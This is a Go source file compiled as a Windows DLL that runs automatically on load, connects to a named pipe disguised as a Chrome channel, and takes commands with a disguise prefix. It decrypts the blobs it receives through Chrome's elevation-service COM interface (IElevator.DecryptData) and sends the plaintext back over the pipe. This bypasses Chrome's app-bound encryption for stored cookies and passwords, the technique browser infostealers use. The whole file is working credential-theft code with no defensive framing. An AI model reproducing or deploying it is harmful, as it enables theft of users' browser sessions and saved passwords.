//go:build windows

package main

import "C"

import (
	"encoding/base64"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	ole32                = windows.NewLazySystemDLL("ole32.dll")
	procCoCreateInstance = ole32.NewProc("CoCreateInstance")

	CLSID_ChromeElevator = windows.GUID{0x1FCBE96C, 0x1697, 0x43AF, [8]byte{0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67}}
	IID_IElevator        = windows.GUID{0xC9C2B807, 0x7731, 0x4F34, [8]byte{0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B}}
	modoleaut32          = windows.NewLazySystemDLL("oleaut32.dll")
	procSysAllocString   = modoleaut32.NewProc("SysAllocString")
	procSysFreeString    = modoleaut32.NewProc("SysFreeString")
)

func SysAllocString(s string) uintptr {
	ptr, _ := windows.UTF16PtrFromString(s)
	ret, _, _ := procSysAllocString.Call(uintptr(unsafe.Pointer(ptr)))
	return ret
}

func SysFreeString(bstr uintptr) {
	procSysFreeString.Call(bstr)
}

type IElevator struct {
	vtbl *IElevatorVtbl
}

type IElevatorVtbl struct {
	QueryInterface uintptr
	AddRef         uintptr
	Release        uintptr
	DecryptData    uintptr
}

func init() {
	go otherdllmain()
}

func otherdllmain() {
	pipeName := `\\.\pipe\ChromeSecureCommunication`

	handle, _ := windows.CreateFile(
		windows.StringToUTF16Ptr(pipeName),
		windows.GENERIC_READ|windows.GENERIC_WRITE,
		0, nil, windows.OPEN_EXISTING, 0, 0,
	)
	defer windows.CloseHandle(handle)

	for {
		var cmdBuffer = make([]byte, 256)
		var bytesRead uint32
		err := windows.ReadFile(handle, cmdBuffer, &bytesRead, nil)
		if err != nil {
			break
		}

		command := string(cmdBuffer[:bytesRead])

		if strings.HasPrefix(command, "dQw4w9WgXcQ") {
			decrypted, _ := base64.StdEncoding.DecodeString(command[11:])
			byteresult := DecryptV20(decrypted)
			var result string
			if byteresult == nil {
				result = "dQw4w9WgXcQ"
			} else {
				result = base64.StdEncoding.EncodeToString(byteresult)
			}
			var written uint32
			windows.WriteFile(handle, []byte(result), &written, nil)
		}
	}
}

func DecryptV20(encryptedBlob []byte) []byte {
	windows.CoInitializeEx(0, windows.COINIT_MULTITHREADED)
	defer windows.CoUninitialize()

	inputStr := string(encryptedBlob)
	inputBSTR := SysAllocString(inputStr)
	defer SysFreeString(inputBSTR)
	var outputBSTR uintptr

	var elevator *IElevator
	procCoCreateInstance.Call(
		uintptr(unsafe.Pointer(&CLSID_ChromeElevator)),
		0,
		uintptr(windows.CLSCTX_LOCAL_SERVER),
		uintptr(unsafe.Pointer(&IID_IElevator)),
		uintptr(unsafe.Pointer(&elevator)),
	)

	if elevator == nil || elevator.vtbl == nil {
		return nil
	}

	hr, _, _ := syscall.Syscall6(
		elevator.vtbl.DecryptData,
		3,
		uintptr(unsafe.Pointer(elevator)),
		uintptr(inputBSTR),
		uintptr(unsafe.Pointer(&outputBSTR)),
		0, 0, 0,
	)

	if hr != 0 {
		return nil
	}
	decryptedStr := windows.UTF16PtrToString((*uint16)(unsafe.Pointer(outputBSTR)))

	syscall.Syscall6(
		elevator.vtbl.Release,
		1,
		uintptr(unsafe.Pointer(elevator)),
		0, 0, 0, 0, 0,
	)

	return []byte(decryptedStr)
}

func main() {}
